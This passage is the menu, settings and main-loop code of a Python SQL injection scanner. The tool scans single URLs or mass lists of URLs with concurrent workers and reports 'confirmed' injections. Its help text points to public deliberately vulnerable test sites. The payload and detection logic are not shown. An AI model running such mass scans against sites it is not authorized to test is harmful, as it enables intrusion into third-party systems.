    print(f"{Fore.GREEN}[4]{Fore.WHITE} Configure Scanner Settings")
    print(f"{Fore.GREEN}[5]{Fore.WHITE} Help & Examples")
    print(f"{Fore.GREEN}[6]{Fore.WHITE} Exit")
    
    return safe_input(f"\n{Fore.CYAN}[+] Select Option (1-6): ", is_int=True, min_val=1, max_val=6)


def configure_scanner():
    """Configura los parámetros del scanner"""
    print(f"\n{Fore.CYAN}{'='*90}")
    print(f"{Fore.YELLOW}                    CONFIGURE SCANNER")
    print(f"{Fore.CYAN}{'='*90}")
    
    max_workers = safe_input(
        f"\n{Fore.CYAN}[+] Max concurrent workers (1-50) [Default: 10]: ",
        is_int=True, default=10, min_val=1, max_val=50
    )
    
    timeout = safe_input(
        f"{Fore.CYAN}[+] Request timeout in seconds (5-60) [Default: 15]: ",
        is_int=True, default=15, min_val=5, max_val=60
    )
    
    return max_workers, timeout


def show_help():
    """Muestra ayuda y ejemplos"""
    print(f"\n{Fore.CYAN}{'='*90}")
    print(f"{Fore.YELLOW}                    HELP & EXAMPLES")
    print(f"{Fore.CYAN}{'='*90}")
    
    help_text = """
{green}[+] HOW TO USE:{white}
  1. For testing: Use option 1 to scan a single URL
  2. For massive scans: Prepare a .txt file with one URL per line
  3. Always filter first: Use option 3 to remove non-scannable URLs

{green}[+] RECOMMENDED TEST URLS:{yellow}
  • http://testphp.vulnweb.com/artists.php?artist=1
  • http://testphp.vulnweb.com/listproducts.php?cat=1
  • https://demo.testfire.net/bank/login.aspx

{green}[+] SAMPLE URLS FILE (urls.txt):{cyan}
  http://example.com/page.php?id=1
  https://target.com/search?q=test
  http://test.com/login.php

{green}[+] WHAT THIS SCANNER DOES:{white}
  1. Filters out non-scannable URLs (PDFs, blogs, documents, etc.)
  2. Tests for SQL Injection in URL parameters
  3. Tests for SQL Injection in forms
  4. Avoids false positives using smart detection
  5. Saves results in TXT and JSON format

{green}[+] TIPS:{yellow}
  • Start with 10-15 workers for optimal performance
  • Use the filter option first to reduce scan time
  • Test with known vulnerable sites first
  • Results are saved automatically
  """.format(
        green=Fore.GREEN,
        yellow=Fore.YELLOW,
        cyan=Fore.CYAN,
        white=Fore.WHITE,
        red=Fore.RED
    )
    
    print(help_text)
    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")


def main():
    """Función principal"""
    # Configuración por defecto
    max_workers = 10
    timeout = 15
    
    while True:
        try:
            choice = show_menu()
            
            if choice == 1:
                # Modo URL única
                url = safe_input(f"\n{Fore.CYAN}[+] Enter URL to scan: ")
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                print(f"{Fore.CYAN}\n[~] Scanning URL: {url}")
                
                scanner = SQLiScanner(max_workers=1, timeout=timeout)
                result_url, vulnerabilities = scanner.scan_single_url(url)
                
                if vulnerabilities:
                    print(f"\n{Fore.RED}[!] VULNERABLE: {result_url}")
                    for vuln_type, vuln_url, vuln_desc in vulnerabilities:
                        print(f"{Fore.YELLOW}    [+] {vuln_type}: {vuln_desc}")
                        if vuln_type == "URL_PARAM":
                            print(f"{Fore.CYAN}        Payload: {vuln_url}")
                    print(f"\n{Fore.GREEN}[+] SQL Injection confirmed!")
                else:
                    print(f"\n{Fore.GREEN}[✓] No SQL Injection vulnerabilities found")
                
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
            
            elif choice == 2:
                # Modo archivo masivo
                filename = safe_input(f"\n{Fore.CYAN}[+] Enter path to URLs file: ")
                
                if not os.path.exists(filename):
                    print(f"{Fore.RED}[✗] File not found: {filename}")
                    input(f"{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                
                # Configurar
                config = safe_input(f"{Fore.CYAN}[+] Configure scanner settings? (Y/N): ").lower()
                if config == 'y':
                    max_workers, timeout = configure_scanner()
                
                output_name = safe_input(
                    f"{Fore.CYAN}[+] Output filename [Default: auto-generated]: ",
                    default=None
                )
                
                filter_first = safe_input(
                    f"{Fore.CYAN}[+] Filter non-scannable URLs first? (Y/N): ",
                    default="Y"
                ).lower() == 'y'
                
                resume = safe_input(
                    f"{Fore.CYAN}[+] Resume previous scan if interrupted? (Y/N): ",
                    default="N"
                ).lower() == 'y'
                
                # Confirmar
                print(f"\n{Fore.YELLOW}[!] Ready to start scan:")
                print(f"{Fore.CYAN}    • Workers: {max_workers}")
                print(f"{Fore.CYAN}    • Timeout: {timeout}s")
                print(f"{Fore.CYAN}    • Filter first: {'Yes' if filter_first else 'No'}")
                print(f"{Fore.CYAN}    • Resume: {'Yes' if resume else 'No'}")
                
                confirm = safe_input(f"\n{Fore.YELLOW}[?] Start scanning? (Y/N): ").lower()
                if confirm == 'y':
                    scanner = SQLiScanner(max_workers=max_workers, timeout=timeout)
                    scanner.scan_from_file(
                        filename=filename,
                        output_file=output_name,
                        resume=resume,
                        filter_first=filter_first
                    )
                
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
            
            elif choice == 3:
                # Solo filtrar URLs
                filename = safe_input(f"\n{Fore.CYAN}[+] Enter path to URLs file: ")
                
                if not os.path.exists(filename):
                    print(f"{Fore.RED}[✗] File not found: {filename}")
                    input(f"{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                
                output_name = safe_input(
                    f"{Fore.CYAN}[+] Output filename [Default: filtered_urls.txt]: ",
                    default="filtered_urls.txt"
                )
                
                scanner = SQLiScanner()
                scanner.filter_urls_file(filename, output_name)
                
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
            
            elif choice == 4:
                # Configuración
                max_workers, timeout = configure_scanner()
                print(f"\n{Fore.GREEN}[✓] Settings updated:")
                print(f"{Fore.CYAN}    • Max workers: {max_workers}")
                print(f"{Fore.CYAN}    • Timeout: {timeout}s")
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
            
            elif choice == 5:
                # Ayuda
                show_help()
            
            elif choice == 6:
                # Salir
                print(f"\n{Fore.CYAN}{'='*90}")
                print(f"{Fore.YELLOW}                    THANK YOU FOR USING SQLI SCANNER!")
                print(f"{Fore.CYAN}{'='*90}")
                print(f"\n{Fore.GREEN}[+] Stay ethical, stay legal, stay secure! 🔒")
                print(f"{Fore.YELLOW}[+] Created for educational and authorized testing only\n")
                time.sleep(1)
                break
        
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}[!] Operation cancelled")
            print(f"{Fore.YELLOW}[+] Returning to menu...\n")
            time.sleep(1)
        
        except Exception as e:
            print(f"\n{Fore.RED}[✗] Error: {str(e)}")
            input(f"{Fore.CYAN}[+] Press Enter to continue...")


# ==============================================
# EJECUCIÓN
# ==============================================
if __name__ == "__main__":
    try:
        # Manejar Ctrl+C
        def signal_handler(sig, frame):
            print(f"\n\n{Fore.RED}[!] Interrupted by user")
            print(f"{Fore.YELLOW}[+] Exiting gracefully...\n")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Ejecutar
        main()
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Program terminated")
        sys.exit(0)
    
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Fatal error: {str(e)}")
        sys.exit(1)